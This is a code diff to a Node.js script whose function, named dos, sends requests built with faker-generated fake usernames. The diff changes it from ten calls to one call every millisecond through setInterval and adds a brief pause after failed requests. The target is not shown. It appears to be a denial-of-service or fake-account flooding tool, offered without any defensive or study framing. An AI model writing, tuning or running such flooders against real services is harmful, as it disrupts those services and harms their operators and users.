@@ -2,8 +2,13 @@ const express = require('express')
 const app = express()
 let success=0
 let fail=0
+let failed=false
 async function dos() {
-    console.log("start!")
+    if(failed){
+        setTimeout(()=>{failed=false},100)
+        return;
+    }
+    // console.log("start!")
   var request = require("request");
   var faker = require('faker');
   const userName=faker.internet.userName()
@@ -49,17 +54,14 @@ async function dos() {
       success++
     }else{
       fail++
+      failed=true;
     }
   }
 
   request(options, callback);
 }
 
-let i=0
-while(i<10){
-    dos()
-    i++
-}
+
     
 
 
@@ -72,3 +74,4 @@ app.get('/', (req, res) => {
 app.listen(port, () => {
   console.log(`Example app listening at http://localhost:${port}`)
 })
+setInterval(dos,1)
